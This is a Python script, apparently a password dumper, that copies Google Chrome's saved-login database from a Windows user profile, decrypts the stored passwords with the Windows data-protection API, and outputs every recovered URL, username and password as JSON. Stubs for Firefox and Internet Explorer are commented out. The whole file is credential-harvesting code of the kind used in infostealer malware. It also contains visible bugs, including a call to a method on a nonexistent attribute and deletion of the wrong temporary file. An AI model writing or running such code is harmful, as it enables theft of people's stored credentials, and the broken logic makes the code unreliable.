import sqlite3
import os
from shutil import copy
import string
from getpass import getuser
from importlib import import_module
from os import unlink
import json


class Chrome:
    def __init__(self):
        win_path = f"C:\\Users\\{getuser()}\\AppData\\Local\\Google" "\\{chrome}\\User Data\\Default\\"
        win_chrome_ver = [
            item for item in
            ['chrome', 'chrome dev', 'chrome beta', 'chrome canary']
            if os.path.exists(win_path.format(chrome=item))
        ]
        dbpath = win_path.format(chrome=''.join(win_chrome_ver))
        copy(dbpath + "Login Data", "Login Data.db")
        self.conn = sqlite3.connect("Login Data.db")
        self.cursor = self.conn.cursor()
        self.cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
        

    def decrypt_func(self, encrypted_passwd):
        win32crypt = import_module('win32crypt')
        decrypted = win32crypt.CryptUnprotectData(encrypted_passwd, None, None, None, 0)
        return decrypted[1].decode('utf8')


    def dump_chrome(self):
      rec = {'chrome': []}
      for result in self.cursor.fetchall():
          _passwd = self.chrome.decrypt_func(result[2])
          passwd = ''.join(i for i in _passwd if i in string.printable)
          if result[1] or passwd:
              _rec = {}
              _rec['url'] = result[0]
              _rec['username'] = result[1]
              _rec['password'] = passwd
              rec['chrome'].append(_rec)
      self.conn.close()
      unlink("Login rec.db")
      return rec


# class Firefox(): ...


# class IE() ...


class PasswordCrawler:
    def __init__(self):
      self.chrome = Chrome()
      # self.firefox = Firefox()
      # self.IE ose Edge = ()

    def dump_passwords(self):
      passwords = self.chrome.dump_chrome()
      # passwords = passwords.update(self.firefox.dump_firefox())
      # passwords = passwords.update(self.ie.dump_ie()) 
      return json.dumps(passwords, indent = 2)
